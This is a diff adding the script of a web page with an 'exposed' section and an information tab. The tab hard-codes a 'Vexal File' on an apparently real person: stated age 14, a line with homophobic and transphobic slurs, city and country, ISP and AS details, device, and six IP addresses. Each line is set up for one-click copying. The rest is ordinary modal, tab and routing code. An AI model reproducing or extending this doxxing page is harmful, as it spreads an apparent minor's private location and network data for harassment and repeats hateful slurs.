+                        <p>${album.desc}</p>
+                    </div>
+                    <div class="expand-indicator"><i class="fas fa-chevron-right"></i></div>
+                </div>
+            `;
+            if (album.isBackend) {
+                card.addEventListener('click', () => openBackend(album.backendUrl));
+            } else {
+                card.addEventListener('click', () => openAlbum(album.images));
+            }
+            grid.appendChild(card);
+        });
+    }
+
+    function openAlbum(images) {
+        const overlay = document.createElement('div');
+        overlay.className = 'modal-overlay';
+        let html = `<div class="album-modal"><div class="album-close" id="albumCloseBtn"><i class="fas fa-times"></i></div>`;
+        images.forEach(img => {
+            html += `<img src="${img}" alt="evidence" loading="lazy" onclick="previewImage('${img}')">`;
+        });
+        html += `</div>`;
+        overlay.innerHTML = html;
+        document.body.appendChild(overlay);
+        document.getElementById('albumCloseBtn').addEventListener('click', () => overlay.remove());
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) overlay.remove();
+        });
+    }
+
+    function openBackend(url) {
+    const overlay = document.createElement('div');
+    overlay.className = 'modal-overlay';
+    overlay.innerHTML = `
+        <div style="background:#1a1a1a;border-radius:20px;max-width:95vw;width:1200px;max-height:90vh;overflow:auto;padding:20px;border:1px solid var(--border);position:relative;">
+            <div style="position:sticky;top:0;background:#1a1a1a;padding:8px 0;text-align:right;z-index:10;">
+                <i class="fas fa-times" style="font-size:28px;cursor:pointer;color:var(--text-gray);" onclick="this.closest('.modal-overlay').remove()"></i>
+            </div>
+            <iframe src="${url}" style="width:100%;height:600px;border:none;border-radius:8px;background:#1a1a1a;" allowfullscreen></iframe>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+}
+
+    function previewImage(src) {
+        const overlay = document.createElement('div');
+        overlay.className = 'modal-overlay';
+        overlay.innerHTML = `
+            <div style="background:#1a1a1a;border-radius:20px;max-width:95vw;width:auto;max-height:90vh;overflow:auto;padding:20px;border:1px solid var(--border);position:relative;">
+                <div style="position:sticky;top:0;background:#1a1a1a;padding:8px 0;text-align:right;z-index:10;">
+                    <i class="fas fa-times" style="font-size:28px;cursor:pointer;color:var(--text-gray);" onclick="this.closest('.modal-overlay').remove()"></i>
+                </div>
+                <img src="${src}" style="max-width:100%;max-height:80vh;border-radius:8px;display:block;margin:0 auto;" alt="preview">
+            </div>
+        `;
+        document.body.appendChild(overlay);
+    }
+
+    function renderInfo() {
+        const grid = document.getElementById('infoGameGrid');
+        grid.innerHTML = '';
+        const infoCard = {
+            title: "Vexal File",
+            desc: "Get Information on Vexal information",
+            data: [
+                "Age: 14",
+                "Gender: (SheMale) #Faggot",
+                "Country: Zimbabwe",
+                "CountyCode: ZW",
+                "Region: HA",
+                "RegionName: Harare",
+                "continent: Africa",
+                "Timezone: Africa/Harare",
+                "Currency: ZWL",
+                "ISP: Maintainer Liquid Telecommunications Operations Limited",
+                "AS: AS37332 Zimbabwe Online",
+                "ASName: ZOL",
+                "Device: Windows 10 (PC)",
+                "Proxy: No",
+                "VPN: No",
+                "hosting: No",
+                "Status: Success",
+                "Known Citys: Main City (Harare), Victoria Falls",
+                "Known IP Address: 41.60.90.128, 41.60.94.218, 41.60.87.31, 41.60.94.46, 41.60.118.6, 41.60.80.136"
+            ]
+        };
+        const card = document.createElement('div');
+        card.className = 'game-card';
+        card.innerHTML = `
+            <div class="game-header">
+                <div class="game-icon"><img src="https://i.imgur.com/6cKnhdJ.png" alt="icon"></div>
+                <div class="game-info">
+                    <h3>${infoCard.title}</h3>
+                    <p>${infoCard.desc}</p>
+                </div>
+                <div class="expand-indicator"><i class="fas fa-chevron-right"></i></div>
+            </div>
+        `;
+        card.addEventListener('click', () => showInfoDetails(infoCard.data));
+        grid.appendChild(card);
+    }
+
+    function showInfoDetails(data) {
+        const grid = document.getElementById('infoGameGrid');
+        const sub = document.getElementById('infoSubContainer');
+        grid.style.display = 'none';
+        sub.style.display = 'block';
+        let html = `<button class="back-button" id="infoBackBtn"><i class="fas fa-arrow-left"></i> Back</button>`;
+        html += `<div class="section-header"><h2>Vexal File</h2><p>Click any line to copy</p></div><div class="info-card">`;
+        data.forEach(item => {
+            html += `<div class="copyable" onclick="copyText(this)"><span>${item}</span><i class="fas fa-copy"></i></div>`;
+        });
+        html += `</div>`;
+        sub.innerHTML = html;
+        document.getElementById('infoBackBtn').addEventListener('click', () => {
+            grid.style.display = 'grid';
+            sub.style.display = 'none';
+        });
+    }
+
+    window.copyText = function(el) {
+        const text = el.querySelector('span').innerText;
+        navigator.clipboard.writeText(text).then(() => {
+            const icon = el.querySelector('i');
+            icon.className = 'fas fa-check';
+            setTimeout(() => { icon.className = 'fas fa-copy'; }, 1500);
+        }).catch(() => {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+        });
+    };
+
+    const homeTab = document.getElementById('homeTab');
+    const showcaseTab = document.getElementById('showcaseTab');
+    const exposedTab = document.getElementById('exposedTab');
+    const infoTab = document.getElementById('informationTab');
+    const platformTab = document.getElementById('platformTab');
+    const navLinks = document.querySelectorAll('.nav-link');
+
+    function setActiveTab(tabId) {
+        homeTab.style.display = 'none';
+        showcaseTab.style.display = 'none';
+        exposedTab.style.display = 'none';
+        infoTab.style.display = 'none';
+        platformTab.style.display = 'none';
+        if (tabId === 'home') homeTab.style.display = 'block';
+        else if (tabId === 'showcase') showcaseTab.style.display = 'block';
+        else if (tabId === 'exposed') exposedTab.style.display = 'block';
+        else if (tabId === 'information') infoTab.style.display = 'block';
+        else if (tabId === 'platform') platformTab.style.display = 'block';
+        navLinks.forEach(link => {
+            link.classList.remove('active');
+            if (link.getAttribute('data-tab') === tabId) link.classList.add('active');
+        });
+    }
+
+const path = window.location.pathname.replace('/', '');
+if (path) {
+    const validTabs = ['home', 'showcase', 'exposed', 'information', 'platform'];
+    if (validTabs.includes(path)) {
+        setActiveTab(path);
+    }
+}
+
+    navLinks.forEach(link => {
+        link.addEventListener('click', () => {
+            const tab = link.getAttribute('data-tab');
+            setActiveTab(tab);
+        });
+    });
+
+    document.getElementById('homeLogoLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        setActiveTab('home');
+    });
+    document.getElementById('homeShowcaseBtn').addEventListener('click', () => setActiveTab('showcase'));
+    document.getElementById('homeExposedBtn').addEventListener('click', () => setActiveTab('exposed'));
+    document.getElementById('footerHomeLink').addEventListener('click', (e) => { e.preventDefault(); setActiveTab('home'); });
+    document.getElementById('footerShowcaseLink').addEventListener('click', (e) => { e.preventDefault(); setActiveTab('showcase'); });
+    document.getElementById('footerExposedLink').addEventListener('click', (e) => { e.preventDefault(); setActiveTab('exposed'); });
+    document.getElementById('footerInfoLink').addEventListener('click', (e) => { e.preventDefault(); setActiveTab('information'); });
+    document.getElementById('footerPlatformLink').addEventListener('click', (e) => { e.preventDefault(); setActiveTab('platform'); });
+
+    document.getElementById('mobileMenuBtn').addEventListener('click', () => {
+        document.getElementById('navLinks').classList.toggle('show');
+    });
+
+    renderPlatforms();
+    renderShowcase();
+    renderExposedVideo();
+    renderExposed();
+    renderInfo();
+    setActiveTab('home');
+
+    function handleHashRouting() {
+        const hash = window.location.hash.replace('#', '');
+        if (hash) {
+            const validTabs = ['home', 'showcase', 'exposed', 'information', 'platform'];
+            if (validTabs.includes(hash)) {
+                setActiveTab(hash);
+            }
+        }
+    }
+
+    window.addEventListener('hashchange', handleHashRouting);
+    handleHashRouting();
+
+    document.querySelectorAll('.nav-link, .footer-links a, #homeShowcaseBtn, #homeExposedBtn, #homeLogoLink').forEach(el => {
+        el.addEventListener('click', function(e) {
+            let tab = this.getAttribute('data-tab');
+            if (!tab && this.id) {
+                if (this.id.includes('home')) tab = 'home';
+                else if (this.id.includes('showcase')) tab = 'showcase';
+                else if (this.id.includes('exposed')) tab = 'exposed';
+                else if (this.id.includes('info')) tab = 'information';
+                else if (this.id.includes('platform')) tab = 'platform';
+            }
+            if (tab) {
+                window.history.pushState(null, '', '/' + tab);
+            }
+        });
+    });
+</script>
+</body>
+</html>
